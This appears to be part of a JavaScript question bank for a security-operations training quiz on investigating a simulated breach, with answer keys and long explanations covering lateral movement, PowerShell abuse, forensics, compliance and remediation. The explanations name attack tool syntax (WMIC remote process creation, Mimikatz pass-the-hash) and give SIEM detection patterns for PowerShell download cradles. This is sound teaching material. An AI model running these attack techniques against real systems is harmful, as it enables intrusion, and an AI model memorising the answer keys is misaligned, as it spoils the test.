                { value: 'shared_account', text: 'Shared service account' }
            ],
            correct: 'compromised_account',
            points: 7,
            explanation: '👤 Compromised Account: jsmith executes malicious PowerShell (download malware) AND creates suspicious domain account on DC-01 (persistence). Context: Brute force succeeded at 13:45, PowerShell executed at 11:08 (could be separate compromise vector - phishing, stolen session). Indicators: 1) Malicious PowerShell (non-admin user should not download/execute scripts), 2) Domain account creation (requires elevated rights - privilege escalation occurred), 3) Service-sounding account name (camouflage). NOT necessarily insider threat (compromised ≠ malicious employee). Actions: **Disable jsmith**, reset password, review all jsmith activity (EventID 4624 logons, 4688 processes, file access), check for additional persistence (scheduled tasks, registry run keys), interview user (phishing email? stolen creds? home computer compromised?).'
        },
        {
            id: 'log26',
            question: 'Sequential SMB connections (port 445) from .55 to .78, .79, .80 suggest which tool?',
            type: 'radio',
            options: [
                { value: 'psexec_wmi', text: 'PsExec, WMI, or other admin tool for lateral movement' },
                { value: 'browser', text: 'Web browser' },
                { value: 'email', text: 'Email client' },
                { value: 'backup', text: 'Backup software' }
            ],
            correct: 'psexec_wmi',
            points: 7,
            explanation: '🛠️ Lateral Movement Tools: **PsExec** (Sysinternals) - remote command execution via SMB (\\\\target\\ADMIN$), **WMI** - invoke-wmimethod Create process, **PowerShell Remoting** - Enter-PSSession, **WMIC** - wmic /node:target process call create, **SMBExec** (Impacket). All use SMB port 445 + admin credentials. Detection: Sequential connections (automated spread), short time intervals (7 seconds between .78→.79→.80), same source, EventID 4624 LogonType 3, process creation EventID 4688 (psexec.exe, wmiprvse.exe). vs Legitimate: File server access (workstation→server not workstation→workstation), domain controller replication. Attacker uses: Stolen admin creds (from brute force/mimikatz) + lateral movement tools. MITRE T1021.002 (SMB), T1047 (WMI).'
        },
        {
            id: 'log27',
            question: 'What is the correct remediation order after containment?',
            type: 'radio',
            options: [
                { value: 'eradicate_recover_lessons', text: '1. Eradicate, 2. Recovery, 3. Lessons Learned' },
                { value: 'recover_first', text: '1. Recovery, 2. Eradicate, 3. Lessons Learned' },
                { value: 'lessons_first', text: '1. Lessons Learned, 2. Eradicate, 3. Recovery' },
                { value: 'skip_eradicate', text: 'Skip eradication, go straight to recovery' }
            ],
            correct: 'eradicate_recover_lessons',
            points: 6,
            explanation: '🔄 NIST IR Lifecycle: 1) Preparation, 2) Detection & Analysis, 3) **Containment** (isolate), 4) **Eradication** (remove threat), 5) **Recovery** (restore operations), 6) **Post-Incident** (lessons learned). Eradicate first: Delete malware (files, processes, registry keys), remove persistence (svcbackup account, scheduled tasks, services), patch vulnerabilities, rebuild compromised hosts from clean images. Recovery: Restore from clean backups, credential rotation (all affected accounts), network restoration, monitoring (ensure no reinfection). Lessons Learned: Root cause, timeline, improve detections, update playbooks, training. Rushing recovery before complete eradication = reinfection (malware/backdoor persists). Forensics: Preserve evidence before eradication (image disks, export logs).'
        },
        {
            id: 'log28',
            question: 'Which Windows Event ID indicates a new process was created?',
            type: 'radio',
            options: [
                { value: '4688', text: 'EventID 4688' },
                { value: '4624', text: 'EventID 4624' },
                { value: '4720', text: 'EventID 4720' },
                { value: '4625', text: 'EventID 4625' }
            ],
            correct: '4688',
            points: 5,
            explanation: '📝 EventID 4688: Process creation (execution tracking). Fields: Process Name (powershell.exe), Command Line (IEX Download...), Parent Process (explorer.exe), User (jsmith), ProcessID. Critical for: Malware execution (detect PowerShell/cmd.exe/wscript with suspicious args), parent-child anomalies (excel.exe → powershell.exe = macro), living-off-the-land (abuse of built-in tools). Requirement: Enable "Audit Process Creation" + "Include command line in process creation events" (GPO). Logging volume: HIGH (every process), requires filtering. SIEM hunt: 4688 + (CommandLine contains "IEX" or "DownloadString" or "-enc" or "bypass"). Alternative: **Sysmon EventID 1** (richer data - hashes, network, registry). Lateral movement: 4688 psexec.exe/wmiprvse.exe on targets.'
        },
        {
            id: 'log29',
            question: 'What is the risk of the web application successful brute force (admin/Summer2024!)?',
            type: 'checkbox',
            options: [
                { value: 'account_takeover', text: 'Account takeover' },
                { value: 'data_breach', text: 'Data breach' },
                { value: 'privilege_escalation', text: 'Privilege escalation' },
                { value: 'pivot', text: 'Pivot to internal network' },
                { value: 'no_risk', text: 'No risk' }
            ],
            correct: ['account_takeover', 'data_breach', 'privilege_escalation', 'pivot'],
            points: 9,
            explanation: '⚠️ Brute Force Impact: **Admin account** = highest privilege. Risks: 1) **Account takeover** - attacker controls admin functions (create users, change settings), 2) **Data breach** - access customer database, PII, credit cards, 3) **Privilege escalation** - admin panel often = full system access, 4) **Pivot** - web app server access → lateral movement to internal network (database servers, file shares). Attack progression: Web shell upload, SQL injection via admin panel, server-side request forgery, credential harvesting. Real-world: Capital One breach (SSRF via web app → AWS metadata → S3 buckets). Defense: MFA (blocks brute force), WAF rate limiting, account lockout, monitoring (alert on new admin logins from new IPs/locations).'
        },
        {
            id: 'log30',
            question: 'The email gateway quarantined paypa1-secure.com but delivered company-vendors.com. What could improve detection?',
            type: 'checkbox',
            options: [
                { value: 'attachment_block', text: 'Block executable file types' },
                { value: 'sandbox', text: 'Sandbox all attachments before delivery' },
                { value: 'typosquat', text: 'Typosquatting detection' },
                { value: 'ml', text: 'Machine learning for phishing detection' },
                { value: 'disable_gateway', text: 'Disable email gateway' }
            ],
            correct: ['attachment_block', 'sandbox', 'typosquat', 'ml'],
            points: 8,
            explanation: '📧 Email Security Layers: **Attachment blocking** - block high-risk extensions (.exe, .vbs, .js, .scr, .bat, .cmd, .hta, .jar), even if zipped. **Sandboxing** - detonate attachments in VM (Cuckoo, FireEye, Proofpoint TAP) before user delivery. **Typosquatting** - detect domains similar to known brands (paypa1 vs paypal - Levenshtein distance, homoglyphs). **ML/AI** - NLP analysis of email body (urgency keywords, brand impersonation, sentiment). Why .vbs delivered: May not be on default block list, no signature match, passed through rules. Other defenses: SPF/DKIM/DMARC enforcement, DMARC p=reject (block spoofed emails), link rewriting (click-time URL analysis), user training (report phishing button), disable Office macros by default.'
        },
        {
            id: 'log31',
            question: 'What data should be collected for forensic analysis from compromised host .88?',
            type: 'checkbox',
            options: [
                { value: 'memory', text: 'Memory dump (RAM' },
                { value: 'disk', text: 'Disk image' },
                { value: 'logs', text: 'Local event logs' },
                { value: 'network', text: 'Network packet capture' },
                { value: 'nothing', text: 'No forensics needed' },
                { value: 'screenshot', text: 'Screenshot only' }
            ],
            correct: ['memory', 'disk', 'logs', 'network'],
            points: 9,
            explanation: '🔬 Digital Forensics - Collection Order: **1. Volatile data** (lost on shutdown): RAM (memory dump - processes, DLLs, network sockets, injected code), network connections (netstat, active sessions), running processes. **2. Persistent data**: Disk image (FTK Imager, dd, KAPE), event logs (Security.evtx, Sysmon), registry hives (HKLM\\SAM, HKCU), browser history/downloads, MFT (Master File Table). **3. Network**: PCAP (active C2 traffic), NetFlow. Tools: Volatility (memory analysis), Autopsy (disk forensics), Wireshark (network). DO NOT: Reimage without forensics (destroys evidence), modify timestamps (maintain integrity), analyze on production system (malware may detect/erase). Chain of custody: Hash (SHA256), document collection time/method, store securely.'
        },
        {
            id: 'log32',
            question: 'Which log source is MOST critical for detecting lateral movement?',
            type: 'radio',
            options: [
                { value: 'windows_security', text: 'Windows Security Event Log' },
                { value: 'firewall', text: 'Firewall logs' },
                { value: 'dns', text: 'DNS logs' },
                { value: 'web_server', text: 'Web server logs' }
            ],
            correct: 'windows_security',
            points: 7,
            explanation: '🔍 Lateral Movement Detection: **Windows Security Log** = gold standard. EventID 4624 (successful logon) with **LogonType 3** (network) shows source/target IP, username, timestamp. Critical events: **4624** (success), **4625** (failed attempts = brute force), **4672** (special privileges assigned = admin rights), **4648** (explicit credentials = runas/PsExec). Correlation: Source workstation + target workstation + SMB port 445 + admin account = lateral movement signature. Firewall: Shows port 445 connections (useful but no authentication context). DNS: Doesn\'t capture lateral movement (SMB uses NetBIOS/IP). Web server: External attacks only. Also useful: **Sysmon** (EventID 3 network connections + EventID 10 process access = injection detection), EDR telemetry (process tree, file modifications).'
        },
        {
            id: 'log33',
            question: 'What is the purpose of the "62.210.37.82" server in this attack?',
            type: 'checkbox',
            options: [
                { value: 'malware_host', text: 'Malware hosting' },
                { value: 'c2_server', text: 'C2 server' },
                { value: 'exfil', text: 'Data exfiltration' },
                { value: 'legitimate', text: 'Legitimate business server' },
                { value: 'victim', text: 'Another victim machine' }
            ],
            correct: ['malware_host', 'c2_server', 'exfil'],
            points: 8,
            explanation: '🖥️ Attacker Infrastructure: **62.210.37.82** = multi-purpose attacker server. Uses: 1) **Malware hosting** - serves script via HTTP (PowerShell DownloadString from /script), 2) **C2 server** - IRC port 6667 (receive commands, send to bots), 3) **Exfiltration** - likely receives stolen data (not shown in logs but common pattern). Server characteristics: Single IP handles multiple attack phases (cost-effective for attacker), likely compromised legitimate server or bulletproof hosting (ignores abuse complaints). WHOIS: Check registration (privacy service?), ASN (hosting provider - often VPS in Eastern Europe/Russia), reputation (VirusTotal, AbuseIPDB, Shodan). Response: Block at firewall, report to hosting provider abuse@, add to threat intel feeds, search for other IPs in same ASN (attack campaign).'
        },
        {
            id: 'log34',
            question: 'The IDOR attempt shows sequential product IDs (5, 6, 7, 8). What is the attacker goal?',
            type: 'radio',
            options: [
                { value: 'enumerate', text: 'Enumerate accessible resources and find broken access control' },
                { value: 'ddos', text: 'DDoS the web application' },
                { value: 'legitimate', text: 'Legitimate user browsing products' },
                { value: 'cache', text: 'Pre-cache product pages' }
            ],
            correct: 'enumerate',
            points: 7,
            explanation: '🔢 IDOR Enumeration: Insecure Direct Object Reference (OWASP A01:2021). Attack: Increment parameter ID (1→2→3...) to access resources without authorization check. Goal: Find object IDs user should not access (other users orders, restricted products, admin panels). Successful IDOR: All requests return 200 OK with different content (broken access control). This case: ID 8 returns 403 = access control working (partial success). Real-world examples: /user?id=123 → id=124 (view other user profiles), /invoice?id=500 → id=501 (view other invoices). Pattern: Sequential IDs, short intervals, same IP, many 40x errors. Prevention: Server-side authZ checks (user owns resource?), non-sequential IDs (UUIDs), indirect references (session-based mapping). Detection: WAF rules (rate of 403s, sequential parameters), behavioral analytics.'
        },
        {
            id: 'log35',
            question: 'How should the security team prioritize remediation of the three compromised hosts?',
            type: 'radio',
            options: [
                { value: 'c2_first', text: '1. .88, 2. .55, 3. .122' },
                { value: 'all_same', text: 'All at the same time' },
                { value: 'dga_first', text: '1. .122, 2. .88, 3. .55' },
                { value: 'lateral_first', text: '1. .55, 2. .88, 3. .122' }
            ],
            correct: 'c2_first',
            points: 7,
            explanation: '🎯 Remediation Priority: **Active threat > Spreading > Attempting**. Order: 1) **.88** - Active C2 connection (attacker has real-time control RIGHT NOW - can execute ransomware, exfiltrate data, spread immediately), 2) **.55** - Actively spreading via SMB lateral movement (infecting .78/.79/.80 - stop propagation), 3) **.122** - DGA attempting to reach C2 (not yet successful - lower risk). Triage factors: Control level (C2 > no C2), spread potential (lateral movement = high), data sensitivity (hosts with PII higher priority). Simultaneous: If resources allow, isolate all 3 immediately (prevent coordination), but forensic analysis order follows priority. Real incidents: Isolate all quickly, then deep-dive analysis on highest threat first.'
        },
        {
            id: 'log36',
            question: 'What should trigger an alert for potential Pass-the-Hash attack?',
            type: 'radio',
            options: [
                { value: 'ntlm_lateral', text: 'NTLM authentication for lateral movement' },
                { value: 'any_smb', text: 'Any SMB traffic' },
                { value: 'rdp_only', text: 'RDP connections only' },
                { value: 'dns_queries', text: 'DNS queries' }
            ],
            correct: 'ntlm_lateral',
            points: 7,
            explanation: '🔑 Pass-the-Hash Detection: Attacker uses NTLM hash (no plaintext password needed) for authentication. Indicators: 1) **NTLM logons** (not Kerberos) - EventID 4624 with NTLM in AuthenticationPackage field (normal = Kerberos in domain), 2) **Unusual account usage** - service accounts from workstation, admin from non-admin PC, 3) **Rapid sequential logons** - same account multiple targets quickly, 4) **Logon from unexpected source** - server account from workstation. Detection query: 4624 + LogonType=3 + AuthenticationPackage=NTLM + SourceIP startswith "192.168." + TargetIP startswith "192.168." (workstation→workstation). Prevention: Disable NTLM (force Kerberos), Protected Users group (no NTLM caching), credential tiering, Credential Guard, LAPS (unique local admin passwords). Tools: Mimikatz (sekurlsa::pth), Impacket.'
        },
        {
            id: 'log37',
            question: 'What compliance/regulatory requirements are triggered by this data breach?',
            type: 'checkbox',
            options: [
                { value: 'notification', text: 'Breach notification' },
                { value: 'forensics', text: 'Forensic investigation and documentation' },
                { value: 'customer', text: 'Customer notification' },
                { value: 'reporting', text: 'Report to regulators' },
                { value: 'no_obligation', text: 'No obligations' }
            ],
            correct: ['notification', 'forensics', 'customer', 'reporting'],
            points: 8,
            explanation: '⚖️ Breach Compliance: **GDPR** (EU) - notify supervisory authority within 72 hours, notify affected individuals if high risk. **HIPAA** (healthcare) - report to HHS within 60 days, notify patients. **State laws** (US) - 47 states have breach notification laws (varies by state). **PCI-DSS** (payment cards) - notify acquiring bank, card brands. **SEC** (public companies) - material breach disclosure within 4 business days. Requirements: **1. Investigation** - scope (what data? how many records?), **2. Notification** - regulator + customers (template, timing), **3. Remediation** - fix vulnerability, prevent recurrence, **4. Documentation** - timeline, evidence, actions taken. Legal/PR coordination: Breach coach (legal counsel), PR firm, cyber insurance. Penalties: GDPR up to €20M or 4% revenue, HIPAA up to $1.5M/year per violation.'
        },
        {
            id: 'log38',
            question: 'Which indicator has the HIGHEST confidence of compromise?',
            type: 'radio',
            options: [
                { value: 'c2_connection', text: 'Established C2 connection' },
                { value: 'port_scan', text: 'Port scan' },
                { value: 'failed_login', text: 'Failed login attempts' },
                { value: 'high_cpu', text: 'High CPU usage' }
            ],
            correct: 'c2_connection',
            points: 6,
            explanation: '🎯 Confidence Levels: **High confidence** = established C2 connection (bidirectional communication with attacker server, commands received/executed). **Medium confidence** = successful brute force (unauthorized access but may be stopped), lateral movement (spreading but may be contained). **Low confidence** = port scan (reconnaissance only, no compromise), failed logins (attempted but blocked). C2 = definitive compromise (attacker controls system). Confidence scoring: Observables (IPs, hashes) → Indicator (pattern) → TTP (behavior) → Incident (confirmed compromise). Factors: Source reliability (threat intel reputation), corroboration (multiple sources), context (environment, timing). High confidence = immediate escalation + containment. Low confidence = monitoring + investigation. STIX confidence scale: Low/Medium/High or 0-100 score.'
        },
        {
            id: 'log39',
            question: 'What PowerShell logging should be enabled to better detect fileless attacks?',
            type: 'checkbox',
            options: [
                { value: 'scriptblock', text: 'Script Block Logging (EventID 4104' },
                { value: 'module', text: 'Module Logging' },
                { value: 'transcription', text: 'Transcription' },
                { value: 'none', text: 'Disable logging' },
                { value: 'basic', text: 'Basic event log only' }
            ],
            correct: ['scriptblock', 'module', 'transcription'],
            points: 8,
            explanation: '📝 PowerShell Logging Triad: **1. Script Block Logging** (EventID 4104) - captures actual code executed (IEX commands, obfuscated scripts), automatic for suspicious blocks, can log all blocks. **2. Module Logging** - tracks loaded modules (Invoke-Mimikatz, Empire), detects malicious module imports. **3. Transcription** - records PowerShell session transcript to file (input+output), detailed forensic trail. Enable via GPO: Computer Configuration → Policies → Administrative Templates → Windows Components → Windows PowerShell. Storage: Logs go to Application log (4104), transcripts to central share (UNC path). SIEM integration: Forward 4104 events (high volume - filter), parse script content (search for IEX, DownloadString, bypass, -enc). Also: AMSI (Antimalware Scan Interface) - runtime script inspection, Constrained Language Mode - restrict dangerous operations.'
        },
        {
            id: 'log40',
            question: 'After containing the incident, what should be done with compromised credentials?',
            type: 'checkbox',
            options: [
                { value: 'reset_all', text: 'Reset passwords for all compromised accounts' },
                { value: 'revoke_sessions', text: 'Revoke all active sessions/tokens for affected users' },
                { value: 'mfa', text: 'Enforce MFA on all accounts' },
                { value: 'monitor', text: 'Monitor for authentication attempts with old credentials' },
                { value: 'keep_same', text: 'Keep same passwords' }
            ],
            correct: ['reset_all', 'revoke_sessions', 'mfa', 'monitor'],
            points: 9,
            explanation: '🔐 Credential Remediation: **Assume compromise** = treat all credentials as stolen. Actions: **1. Immediate reset** - admin (brute forced), jsmith (used maliciously), svcbackup (delete entirely - backdoor). **2. Session revocation** - kill all Kerberos tickets (klist purge), terminate RDP/SSH sessions, invalidate web application sessions (force re-login). **3. MFA enforcement** - require second factor (TOTP, push, hardware key) - blocks credential replay. **4. Monitoring** - watch for authentication attempts with old creds (attacker tries to regain access), alert on account usage from unusual locations. **5. Krbtgt reset** (domain-wide) - if Golden Ticket suspected (reset TWICE with 24hr gap - clears old keys). Also: Audit privileged groups (Domain Admins membership), check for hidden accounts (disabled display), LAPS for local admin passwords. MITRE T1078 (Valid Accounts).'
        },
        {
            id: 'log41',
            question: 'What network segmentation would have prevented or limited this attack?',
            type: 'checkbox',
            options: [
                { value: 'workstation_segment', text: 'Block SMB between workstations' },
                { value: 'dmz', text: 'Web application in DMZ' },
                { value: 'vlan', text: 'VLANs with inter-VLAN firewall rules' },
                { value: 'no_segmentation', text: 'Segmentation not effective (wouldn\'t help)' },
                { value: 'physical_only', text: 'Physical separation only' }
            ],
            correct: ['workstation_segment', 'dmz', 'vlan'],
            points: 9,
            explanation: '🔒 Network Segmentation Defense: **Workstation isolation** - block port 445 SMB between workstations (192.168.10.x→192.168.10.x), allow workstation→file server only = prevents lateral movement. **DMZ** - web application (public-facing) separated from internal (even if compromised, can\'t reach internal hosts). **VLANs** - separate subnets (Users VLAN 10, Servers VLAN 20, Admin VLAN 30) with inter-VLAN firewall (default deny). **Micro-segmentation** (Zero Trust) - workload-to-workload policies (host-based firewall, SDN). This attack: .55 spreads to .78/.79/.80 via SMB = workstation segmentation would block. Web app brute force → internal network = DMZ isolation prevents. Segments: User workstations, servers, domain controllers, DMZ, guest WiFi, IoT, OT/ICS. Defense-in-depth: Perimeter + internal segmentation. Purdue Model (ICS/OT) = 6 levels of segmentation.'
        },
        {
            id: 'log42',
            question: 'What threat intelligence should be shared after this incident?',
            type: 'checkbox',
            options: [
                { value: 'iocs', text: 'IOCs' },
                { value: 'ttps', text: 'TTPs' },
                { value: 'vulnerabilities', text: 'Exploited vulnerabilities' },
                { value: 'lessons', text: 'Lessons learned' },
                { value: 'nothing', text: 'Keep confidential' }
            ],
            correct: ['iocs', 'ttps', 'vulnerabilities', 'lessons'],
            explanation: '🔗 Threat Intel Sharing: **IOCs** - 62.210.37.82 (C2 server), paypa1-secure.com (phishing domain), file hashes (if obtained), malicious PowerShell script. **TTPs** - T1110 (brute force), T1021.002 (SMB lateral), T1071.001 (IRC C2), T1059.001 (PowerShell). **Vulnerabilities** - weak password policy (Summer2024!), lack of MFA, workstation-to-workstation SMB allowed, email gateway gaps. **Lessons** - detection rules added, playbook improvements. Share with: **ISAC** (sector-specific - FS-ISAC, H-ISAC), **MISP** (community platform), **STIX/TAXII feeds** (automated), **AlienVault OTX** (public). Benefits: Protect others (block IPs), improve defenses (learn from others), community resilience. Legal: Check disclosure requirements (NDA, regulations), sanitize sensitive data (internal IPs, company names). MITRE Cyber Threat Intelligence framework.'
        },
        {
            id: 'log43',
            question: 'What EDR telemetry would have provided earliest detection?',
            type: 'radio',
            options: [
                { value: 'powershell_network', text: 'PowerShell spawning network connection' },
                { value: 'file_scan', text: 'File hash scanning only' },
                { value: 'disk_usage', text: 'Disk space monitoring' },
                { value: 'cpu_usage', text: 'CPU usage alerts' }
            ],
            correct: 'powershell_network',
            points: 8,
            explanation: '🔍 EDR Behavioral Detection: **Process-Network correlation** = PowerShell (legit binary) making external connection (suspicious). EDR rule: "powershell.exe OR cmd.exe OR wscript.exe + outbound connection + suspicious domain/IP" = alert. This catches: Fileless malware (IEX DownloadString), C2 beaconing, data exfiltration. Earlier detection: **Before** IRC C2 established (caught at PowerShell download stage). EDR advantages: Host-level visibility (sees processes AV misses), behavioral rules (no signature needed), parent-child process tree (excel.exe → powershell.exe = macro). Other high-value EDR rules: Credential dumping (access to lsass.exe), lateral movement (psexec.exe, wmiprvse.exe), persistence (registry run keys, scheduled tasks), suspicious network (DGA domains, unusual ports). Products: CrowdStrike, Carbon Black, SentinelOne, Microsoft Defender ATP. MITRE ATT&CK mapped detections.'
        },
        {
            id: 'log44',
            question: 'What is the blast radius of this attack (extent of compromise)?',
            type: 'radio',
            options: [
                { value: 'multiple_systems', text: 'Multiple systems + domain controller + web application' },
                { value: 'single_system', text: 'Single workstation only' },
                { value: 'entire_domain', text: 'Entire Active Directory domain compromised' },
                { value: 'no_compromise', text: 'No systems compromised' }
            ],
            correct: 'multiple_systems',
            points: 7,
            explanation: '💥 Blast Radius Assessment: **Directly compromised**: .55 (lateral movement source), .88 (C2 + brute force victim), .122 (DGA malware). **Indirectly compromised**: .78/.79/.80 (lateral movement targets - likely compromised), DC-01 (malicious account created - privileged access), web application admin account. **Credentials**: admin (web app), jsmith (domain), svcbackup (domain admin). **Potential** (not confirmed): Domain-wide compromise if svcbackup has DA rights (Golden Ticket, DCSync, GPO modification). Scope: Assume worst-case until forensics proves otherwise. Blast radius determines: 1) Incident severity (SEV1 = domain compromise, SEV2 = multiple hosts), 2) Notification scope (which business units affected), 3) Remediation effort (3 hosts vs 300). Containment prevents blast radius expansion.'
        },
        {
            id: 'log45',
            question: 'How should the organization improve defenses to prevent recurrence?',
            type: 'checkbox',
            options: [
                { value: 'mfa', text: 'Mandatory MFA for all accounts' },
                { value: 'segmentation', text: 'Network segmentation' },
                { value: 'edr', text: 'Deploy EDR with behavioral rules' },
                { value: 'password_policy', text: 'Stronger password policy' },
                { value: 'training', text: 'Security awareness training' },
                { value: 'do_nothing', text: 'No changes needed' }
            ],
            correct: ['mfa', 'segmentation', 'edr', 'password_policy', 'training'],
            explanation: '🛡️ Defense Improvements (Lessons Learned): **1. MFA** - TOTP/push for all accounts (brute force fails even with password). **2. Segmentation** - internal firewall rules (stop lateral movement). **3. EDR** - behavioral analytics (catch fileless PowerShell, C2 beaconing). **4. Password policy** - 12+ chars, no seasons/years, passphrase, leaked password check (HaveIBeenPwned API). **5. Email security** - sandbox attachments, block .vbs/.exe/.js, DMARC p=reject. **6. Training** - monthly phishing simulations, report suspicious emails. **7. Monitoring** - PowerShell logging, Sysmon, SIEM correlation rules (detect patterns in this attack). **8. Patching** - vulnerability management (CVE remediation). **9. Least privilege** - users should not have admin rights, separate admin accounts (PAW - Privileged Access Workstation). **10. Incident response** - tabletop exercises, playbooks, retainer with IR firm. Defense-in-depth = multiple layers.'
        },
        {
            id: 'log46',
            question: 'What SIEM correlation rule would detect this attack pattern?',
            type: 'radio',
            options: [
                { value: 'multi_stage', text: 'Multi-stage rule: Failed logins → Success → PowerShell execution → External connection from same host within 1 hour' },
                { value: 'single_event', text: 'Single event rule' },
                { value: 'manual_review', text: 'Manual review only' },
                { value: 'volume_only', text: 'Volume-based rule' }
            ],
            correct: 'multi_stage',
            points: 9,
            explanation: '🔗 SIEM Correlation Rule: **Kill chain detection** - link multiple stages across time/log sources. Rule: "IF (multiple EventID 4625 failed logins from IP_X) AND THEN (EventID 4624 success from IP_X) AND THEN (EventID 4688 powershell.exe -enc OR DownloadString) AND THEN (firewall ALLOW outbound from same host to suspicious IP) WITHIN 60 minutes → Alert: Brute Force + Compromise + Malware Execution". SIEM strengths: Correlate across systems (web server, Windows, firewall, DNS), temporal correlation (sequence + timing), threat intelligence enrichment (check IPs against feeds). Limitations: Requires normalized data, accurate timestamps, low latency ingestion. Splunk example: "index=windows EventCode=4625 | stats count by src_ip | where count>5 | join src_ip [search EventCode=4624] | join host [search EventCode=4688 powershell*]". Elastic: EQL queries (Event Query Language) for sequence detection.'
        },
        {
            id: 'log47',
            question: 'What is the estimated attacker dwell time in this incident?',
            type: 'radio',
            options: [
                { value: 'hours', text: 'Hours' },
                { value: 'minutes', text: 'Minutes only' },
                { value: 'months', text: 'Months' },
                { value: 'unknown', text: 'Cannot determine from logs' }
            ],
            correct: 'hours',
            points: 7,
            explanation: '⏰ Dwell Time: Time from initial compromise to detection. Timeline: **Earliest indicator**: jsmith PowerShell download at 11:08:38 (OR earlier unlogged compromise). **Latest indicator**: New account creation at 11:15:22, lateral movement visible at 10:42:08. **Web brute force**: 13:45 (different day or clock skew). Actual dwell time: Likely **hours to days** (need full forensic timeline). Industry average: **24 days** (Mandiant M-Trends 2024). This incident: Detected via log analysis (reactive), not real-time alerting (proactive). Dwell time reduction: **1. EDR behavioral detection** (minutes), **2. SIEM real-time correlation** (minutes-hours), **3. Threat hunting** (days-weeks), **4. External notification** (months - breach notification from law enforcement). Faster detection = less damage (data exfil, ransomware, credential theft). Goal: <1 hour dwell time for critical systems.'
        },
        {
            id: 'log48',
            question: 'What should be included in the incident report for management?',
            type: 'checkbox',
            options: [
                { value: 'executive_summary', text: 'Executive summary' },
                { value: 'timeline', text: 'Attack timeline with key events' },
                { value: 'impact', text: 'Impact assessment' },
                { value: 'root_cause', text: 'Root cause analysis' },
                { value: 'recommendations', text: 'Recommendations with priorities and costs' },
                { value: 'technical_only', text: 'Technical details only' }
            ],
            correct: ['executive_summary', 'timeline', 'impact', 'root_cause', 'recommendations'],
            explanation: '📊 Incident Report Structure: **Executive Summary** - 1 page, non-technical (3 hosts compromised, credentials stolen, contained within 2 hours, estimated $X impact). **Timeline** - key events (first compromise → detection → containment → remediation), visual diagram. **Impact** - systems affected (3 workstations, 1 DC, 1 web app), data (credentials, potential PII), downtime (2 hours isolation), financial ($Y incident response + $Z improvements). **Root Cause** - weak password (Summer2024!), no MFA, lateral movement not blocked, email gateway missed .vbs. **Recommendations** - prioritized (1. MFA - $10k, 2 weeks; 2. EDR - $50k, 1 month; 3. Segmentation - $30k, 6 weeks). **Appendices** - technical details, IOCs, forensic reports, compliance notifications. Audience: Board, C-suite, legal, audit, insurance. Format: PowerPoint summary + PDF detailed report. SANS ICS515 template, NIST 800-61 guidance.'
        },
        {
            id: 'log49',
            question: 'Which law enforcement notification may be required?',
            type: 'checkbox',
            options: [
                { value: 'fbi', text: 'FBI Internet Crime Complaint Center' },
                { value: 'secret_service', text: 'Secret Service' },
                { value: 'state_police', text: 'State/local police' },
                { value: 'interpol', text: 'INTERPOL' },
                { value: 'no_requirement', text: 'No law enforcement notification required' }
            ],
            correct: ['fbi', 'secret_service', 'state_police'],
            explanation: '🚔 Law Enforcement Notification: **FBI IC3** (ic3.gov) - voluntary reporting (helps with attribution, may assist investigation). **FBI Cyber Division** - major breaches, critical infrastructure. **Secret Service** - financial crimes (credit card breach, wire fraud, banking). **State/Local** - some state laws require police report (identity theft statutes). **CISA** (Cybersecurity & Infrastructure Security Agency) - critical infrastructure sectors (energy, healthcare, finance). Benefits: **Resources** (forensic assistance, threat intel), **Attribution** (track attacker), **Recovery** (potential to recover stolen funds), **Prevention** (arrest attacker, dismantle infrastructure). Challenges: **Evidence preservation** (chain of custody), **Disclosure** (may become public), **Resource requirements** (cooperate with investigation). When: **Report early** (within 24-48 hours), provide: IOCs, logs, forensic images, timeline, impact assessment. Liaison: Designate point of contact (legal counsel, CISO).'
        },
        {
            id: 'log50',
            question: 'What is the most important lesson learned from this incident?',
            type: 'radio',
            options: [
                { value: 'defense_in_depth', text: 'Defense-in-depth: Single controls failed' },
                { value: 'antivirus_enough', text: 'Antivirus alone is sufficient' },
                { value: 'firewalls_enough', text: 'Perimeter firewall is enough' },
                { value: 'no_lessons', text: 'Attack was unpreventable' }
            ],
            correct: 'defense_in_depth',
            points: 10,
            explanation: '🎓 Key Lesson - Defense-in-Depth: **No single control is sufficient**. Failures: 1) **Perimeter** - web app brute force succeeded (no rate limiting, no MFA), 2) **Network** - lateral movement via SMB (no segmentation), 3) **Endpoint** - fileless PowerShell executed (no EDR, insufficient logging), 4) **Email** - .vbs delivered (gateway missed), 5) **Identity** - weak password (no policy enforcement), 6) **Detection** - reactive log analysis not real-time SIEM alerting. Defense-in-depth = **Castle approach**: Moat (perimeter firewall), walls (segmentation), guards (EDR, IDS), locks (MFA), cameras (logging/SIEM), patrols (threat hunting). If one layer fails, others compensate. NIST Cybersecurity Framework: Identify → Protect → **Detect** → Respond → Recover. Swiss cheese model: Holes in layers, but misalignment prevents full penetration. Investment priority: People (training), Process (playbooks), Technology (tools). Continuous improvement: Test defenses (red team), measure (metrics), adapt (threat landscape evolves).'
        }
    ]
};
